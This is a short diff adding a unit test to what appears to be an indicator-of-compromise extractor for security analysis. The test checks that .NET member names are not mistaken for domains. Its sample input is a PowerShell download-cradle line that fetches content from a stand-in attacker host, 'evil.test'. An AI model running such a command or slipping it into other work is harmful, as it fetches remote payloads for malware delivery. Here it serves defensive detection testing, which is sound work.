@@ -25,4 +25,14 @@ describe('extractIocs', () => {
     expect(iocs.filter((i) => i.raw === 'http://a.test/x')).toHaveLength(1)
     expect(iocs[0].layerIndex).toBe(0)
   })
+
+  it('does not extract .NET member-access tokens as domains', () => {
+    const iocs = extractIocs([
+      { index: 0, text: "$wc = New-Object Net.WebClient; $wc.DownloadString('http://evil.test/x')" },
+    ])
+    const raws = iocs.map((i) => i.raw)
+    expect(raws).toContain('http://evil.test/x')  // the real URL is kept
+    expect(raws).not.toContain('Net.WebClient')    // PascalCase member dropped
+    expect(raws).not.toContain('wc.DownloadString')
+  })
 })
